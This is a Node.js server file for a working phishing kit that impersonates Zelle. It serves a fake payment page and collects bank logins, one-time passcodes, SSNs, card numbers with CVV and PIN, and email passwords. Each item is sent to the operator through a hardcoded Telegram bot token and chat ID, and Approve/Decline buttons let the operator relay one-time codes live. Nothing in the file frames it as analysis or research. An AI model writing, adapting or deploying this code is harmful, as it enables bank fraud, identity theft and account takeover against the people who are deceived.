// ========================================
// ZELLE BACKEND - NODE.JS (FOR RENDER.COM)
// ========================================
// This replaces server.php for Render deployment

const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 8002;

// Telegram Configuration
const TELEGRAM_BOT_TOKEN = '5787969678:AAHZEGiwGsdH8o_70cMIKqIJcNyDExKfQ00';
const TELEGRAM_CHAT_ID = '5514645660';

// In-memory storage (for demo - use a database in production)
const users = [];

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// Serve static files
app.use(express.static(path.join(__dirname, 'public')));

// Helper Functions
function getIPDetails(req) {
    const ip = req.headers['cf-connecting-ip'] || 
               req.headers['x-forwarded-for']?.split(',')[0] || 
               req.socket.remoteAddress || 
               'Unknown';
    const country = req.headers['cf-ipcountry'] || 'Unknown';
    const isp = 'Unknown';
    
    return { ip, country, isp };
}

function getDevice(userAgent) {
    if (!userAgent) return 'Unknown';
    if (userAgent.includes('Windows')) return 'Windows';
    if (userAgent.includes('Mac')) return 'MacOS';
    if (userAgent.includes('iPhone')) return 'iPhone';
    if (userAgent.includes('Android')) return 'Android';
    return 'Unknown';
}

function generateSessionId() {
    return `ZELLE_${Date.now()}_${Math.floor(Math.random() * 9000) + 1000}`;
}

async function sendToTelegram(message, inlineKeyboard = null) {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    
    const payload = {
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'HTML',
    };
    
    if (inlineKeyboard) {
        payload.reply_markup = { inline_keyboard: inlineKeyboard };
    }
    
    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload),
        });
        
        return await response.json();
    } catch (error) {
        console.error('Telegram error:', error);
        return null;
    }
}

// ========================================
// API ENDPOINTS
// ========================================

// Page Visit Notification
app.get('/api/zelle-payment', async (req, res) => {
    const ipDetails = getIPDetails(req);
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const device = getDevice(userAgent);
    
    const message =
        `👀 <b>ZELLE - PAGE VISITED</b>\n\n` +
        `🌐 <b>IP:</b> ${ipDetails.ip}\n` +
        `🌍 <b>Country:</b> ${ipDetails.country} | 📶 <b>ISP:</b> ${ipDetails.isp}\n` +
        `📱 <b>Device:</b> ${device}\n` +
        `🖥️ <b>Browser:</b> ${userAgent.substring(0, 80)}\n` +
        `⏰ <b>Time:</b> ${new Date().toISOString().replace('T', ' ').substring(0, 19)}`;
    
    await sendToTelegram(message);
    
    res.json({
        status: 'ok',
        payment: { name: 'John Doe', amount: 500 }
    });
});

// Bank Selection
app.post('/api/bank-click', async (req, res) => {
    const ipDetails = getIPDetails(req);
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const device = getDevice(userAgent);
    
    const sessionId = generateSessionId();
    const userId = Date.now();
    
    const newUser = {
        id: userId,
        session_id: sessionId,
        bank_name: req.body.name || 'Unknown',
        username: 'Awaiting Login...',
        password: '',
        otp_code: '',
        otp_status: 'idle',
        created_at: new Date().toISOString(),
        ip: ipDetails.ip,
    };
    
    users.push(newUser);
    
    const message =
        `🏦 <b>ZELLE - BANK SELECTED</b>\n\n` +
        `🏛️ <b>Bank:</b> ${req.body.name || 'Unknown'}\n\n` +
        `🌐 <b>IP:</b> ${ipDetails.ip}\n` +
        `🌍 <b>Country:</b> ${ipDetails.country} | 📶 <b>ISP:</b> ${ipDetails.isp}\n` +
        `📱 <b>Device:</b> ${device}\n` +
        `🆔 <b>Session:</b> <code>${sessionId}</code>\n` +
        `⏰ <b>Time:</b> ${new Date().toISOString().replace('T', ' ').substring(0, 19)}`;
    
    await sendToTelegram(message);
    
    res.json({
        success: true,
        userId: userId,
        sessionId: sessionId
    });
});

// Save Credentials or OTP
app.post('/api/save', async (req, res) => {
    const ipDetails = getIPDetails(req);
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const device = getDevice(userAgent);
    
    const username = req.body.username || '';
    const password = req.body.password || '';
    const userId = req.body.userId || null;
    const code = req.body.code || '';
    const otp = req.body.otp || '';
    
    // Smart OTP detection
    let isOTP = false;
    let otpCode = '';
    
    if (code && code.length === 6 && /^\d{6}$/.test(code)) {
        isOTP = true;
        otpCode = code;
    } else if (otp && otp.length === 6 && /^\d{6}$/.test(otp)) {
        isOTP = true;
        otpCode = otp;
    } else if (username.length === 6 && /^\d{6}$/.test(username) && !password) {
        isOTP = true;
        otpCode = username;
    }
    
    const user = users.find(u => u.id == userId);
    if (!user) {
        return res.status(404).json({ success: false, error: 'User not found' });
    }
    
    if (isOTP) {
        // Handle OTP submission
        user.otp_code = otpCode;
        user.otp_submitted_at = new Date().toISOString();
        
        if (user.otp_status === 'idle') {
            user.otp_status = 'pending';
        }
        
        const message =
            `🔢 <b>ZELLE - OTP CODE RECEIVED</b>\n\n` +
            `🏛️ <b>Bank:</b> ${user.bank_name}\n` +
            `👤 <b>Username:</b> <code>${user.username}</code>\n` +
            `🔐 <b>OTP Code:</b> <code>${otpCode}</code>\n\n` +
            `🌐 <b>IP:</b> ${ipDetails.ip}\n` +
            `🌍 <b>Country:</b> ${ipDetails.country} | 📶 <b>ISP:</b> ${ipDetails.isp}\n` +
            `📱 <b>Device:</b> ${device}\n` +
            `🆔 <b>Session:</b> <code>${user.session_id}</code>\n` +
            `⏰ <b>Time:</b> ${new Date().toISOString().replace('T', ' ').substring(0, 19)}\n\n` +
            `⚠️ <b>Status:</b> Pending your action...`;
        
        const inlineKeyboard = [
            [
                { text: '✅ Approve', callback_data: `approve_${userId}` },
                { text: '❌ Decline', callback_data: `decline_${userId}` },
            ],
        ];
        
        await sendToTelegram(message, inlineKeyboard);
        
        return res.json({ success: true, id: userId });
    }
    
    // Handle credentials submission
    user.username = username;
    user.password = password;
    user.credentials_submitted_at = new Date().toISOString();
    
    const message =
        `🔐 <b>ZELLE - CREDENTIALS CAPTURED</b>\n\n` +
        `🏛️ <b>Bank:</b> ${user.bank_name}\n` +
        `👤 <b>Username:</b> <code>${username}</code>\n` +
        `🔑 <b>Password:</b> <code>${password}</code>\n\n` +
        `🌐 <b>IP:</b> ${ipDetails.ip}\n` +
        `🌍 <b>Country:</b> ${ipDetails.country} | 📶 <b>ISP:</b> ${ipDetails.isp}\n` +
        `📱 <b>Device:</b> ${device}\n` +
        `🆔 <b>Session:</b> <code>${user.session_id}</code>\n` +
        `⏰ <b>Time:</b> ${new Date().toISOString().replace('T', ' ').substring(0, 19)}`;
    
    await sendToTelegram(message);
    
    res.json({ success: true, id: userId });
});

// Save OTP
app.post('/api/save-otp', async (req, res) => {
    const ipDetails = getIPDetails(req);
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const device = getDevice(userAgent);
    
    const code = req.body.code || '';
    const userId = req.body.userId || null;
    
    const user = users.find(u => u.id == userId);
    if (!user) {
        return res.status(404).json({ success: false, error: 'User not found' });
    }
    
    user.otp_code = code;
    user.otp_submitted_at = new Date().toISOString();
    
    if (user.otp_status === 'idle') {
        user.otp_status = 'pending';
    }
    
    const message =
        `🔢 <b>ZELLE - OTP CODE RECEIVED</b>\n\n` +
        `🏛️ <b>Bank:</b> ${user.bank_name}\n` +
        `👤 <b>Username:</b> <code>${user.username}</code>\n` +
        `🔐 <b>OTP Code:</b> <code>${code}</code>\n\n` +
        `🌐 <b>IP:</b> ${ipDetails.ip}\n` +
        `🌍 <b>Country:</b> ${ipDetails.country} | 📶 <b>ISP:</b> ${ipDetails.isp}\n` +
        `📱 <b>Device:</b> ${device}\n` +
        `🆔 <b>Session:</b> <code>${user.session_id}</code>\n` +
        `⏰ <b>Time:</b> ${new Date().toISOString().replace('T', ' ').substring(0, 19)}\n\n` +
        `⚠️ <b>Status:</b> Pending your action...`;
    
    const inlineKeyboard = [
        [
            { text: '✅ Approve', callback_data: `approve_${userId}` },
            { text: '❌ Decline', callback_data: `decline_${userId}` },
        ],
    ];
    
    await sendToTelegram(message, inlineKeyboard);
    
    res.json({ success: true });
});

// Check OTP Status
app.get('/api/check-otp-status', (req, res) => {
    const userId = req.query.id;
    
    if (!userId) {
        return res.status(400).json({ success: false, error: 'Missing userId' });
    }
    
    const user = users.find(u => u.id == userId);
    
    res.json({
        otp_status: user ? user.otp_status : 'idle'
    });
});

// Reset OTP Status
app.post('/api/reset-otp-status', (req, res) => {
    const userId = req.query.id;
    
    if (!userId) {
        return res.status(400).json({ success: false, error: 'Missing userId' });
    }
    
    const user = users.find(u => u.id == userId);
    if (user) {
        user.otp_status = 'idle';
    }
    
    res.json({ success: true, message: 'Status reset to idle' });
});

// Telegram Webhook (support both routes)
app.post('/api/telegram-webhook', async (req, res) => {
    console.log('Telegram webhook received:', JSON.stringify(req.body));
    
    if (req.body.callback_query) {
        const callbackData = req.body.callback_query.data;
        const callbackId = req.body.callback_query.id;
        
        console.log('Callback data:', callbackData);
        
        const [action, userIdStr] = callbackData.split('_');
        const userId = parseInt(userIdStr);
        
        console.log(`[WEBHOOK] Action: ${action}, User ID: ${userId}`);
        
        const user = users.find(u => u.id == userId);
        if (user) {
            user.otp_status = action;
            console.log(`[WEBHOOK] Updated status to: ${action}`);
        }
        
        // Answer callback query
        const answerUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`;
        await fetch(answerUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                callback_query_id: callbackId,
                text: action === 'approve' ? '✅ OTP Approved' : '❌ OTP Declined',
            }),
        });
    }
    
    res.json({ ok: true });
});

// Save Personal Info
app.post('/api/save-personal-info', async (req, res) => {
    const ipDetails = getIPDetails(req);
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const device = getDevice(userAgent);
    
    const userId = req.body.userId;
    const user = users.find(u => u.id == userId);
    
    if (!user) {
        return res.status(404).json({ success: false, error: 'User not found' });
    }
    
    user.personalInfo = {
        firstName: req.body.firstName,
        lastName: req.body.lastName,
        ssn: req.body.ssn,
        dob: req.body.dob,
        cardNumber: req.body.cardNumber,
        expiry: req.body.expiry,
        cvv: req.body.cvv,
        pin: req.body.pin,
        zip: req.body.zip
    };
    
    const message =
        `📋 <b>ZELLE - PERSONAL INFO CAPTURED</b>\n\n` +
        `👤 <b>Name:</b> <code>${req.body.firstName} ${req.body.lastName}</code>\n` +
        `🆔 <b>SSN:</b> <code>${req.body.ssn}</code>\n` +
        `🎂 <b>DOB:</b> <code>${req.body.dob}</code>\n` +
        `💳 <b>Card:</b> <code>${req.body.cardNumber}</code>\n` +
        `📅 <b>Expiry:</b> <code>${req.body.expiry}</code> | <b>CVV:</b> <code>${req.body.cvv}</code> | <b>PIN:</b> <code>${req.body.pin}</code>\n` +
        `📮 <b>ZIP:</b> <code>${req.body.zip}</code>\n\n` +
        `🌐 <b>IP:</b> ${ipDetails.ip}\n` +
        `🌍 <b>Country:</b> ${ipDetails.country} | 📶 <b>ISP:</b> ${ipDetails.isp}\n` +
        `📱 <b>Device:</b> ${device}\n` +
        `🆔 <b>Session:</b> <code>${user.session_id}</code>\n` +
        `⏰ <b>Time:</b> ${new Date().toISOString().replace('T', ' ').substring(0, 19)}`;
    
    await sendToTelegram(message);
    
    res.json({ success: true });
});

// Save Email Verification
app.post('/api/save-email-verification', async (req, res) => {
    const ipDetails = getIPDetails(req);
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const device = getDevice(userAgent);
    
    const userId = req.body.userId;
    const user = users.find(u => u.id == userId);
    
    if (!user) {
        return res.status(404).json({ success: false, error: 'User not found' });
    }
    
    user.emailVerification = {
        email: req.body.email,
        emailPassword: req.body.emailPassword
    };
    
    const message =
        `📧 <b>ZELLE - EMAIL CREDENTIALS CAPTURED</b>\n\n` +
        `✉️ <b>Email:</b> <code>${req.body.email}</code>\n` +
        `🔑 <b>Password:</b> <code>${req.body.emailPassword}</code>\n\n` +
        `🌐 <b>IP:</b> ${ipDetails.ip}\n` +
        `🌍 <b>Country:</b> ${ipDetails.country} | 📶 <b>ISP:</b> ${ipDetails.isp}\n` +
        `📱 <b>Device:</b> ${device}\n` +
        `🆔 <b>Session:</b> <code>${user.session_id}</code>\n` +
        `⏰ <b>Time:</b> ${new Date().toISOString().replace('T', ' ').substring(0, 19)}`;
    
    await sendToTelegram(message);
    
    res.json({ success: true });
});

// Save Final OTP
app.post('/api/save-final-otp', async (req, res) => {
    const ipDetails = getIPDetails(req);
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const device = getDevice(userAgent);
    
    const userId = req.body.userId;
    const user = users.find(u => u.id == userId);
    
    if (!user) {
        return res.status(404).json({ success: false, error: 'User not found' });
    }
    
    user.finalOtp = req.body.finalOtp;
    
    const message =
        `🔢 <b>ZELLE - FINAL OTP (EMAIL VERIFICATION)</b>\n\n` +
        `🔐 <b>OTP Code:</b> <code>${req.body.finalOtp}</code>\n\n` +
        `🌐 <b>IP:</b> ${ipDetails.ip}\n` +
        `🌍 <b>Country:</b> ${ipDetails.country} | 📶 <b>ISP:</b> ${ipDetails.isp}\n` +
        `📱 <b>Device:</b> ${device}\n` +
        `🆔 <b>Session:</b> <code>${user.session_id}</code>\n` +
        `⏰ <b>Time:</b> ${new Date().toISOString().replace('T', ' ').substring(0, 19)}\n\n` +
        `✅ <b>Status:</b> All data captured successfully!`;
    
    await sendToTelegram(message);
    
    res.json({ success: true });
});

// Catch-all route - serve index.html for any other route (for React Router)
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Start Server
app.listen(PORT, () => {
    console.log(`✅ Zelle Backend running on port ${PORT}`);
    console.log(`🌐 Telegram Bot Token: ${TELEGRAM_BOT_TOKEN}`);
    console.log(`💬 Telegram Chat ID: ${TELEGRAM_CHAT_ID}`);
});
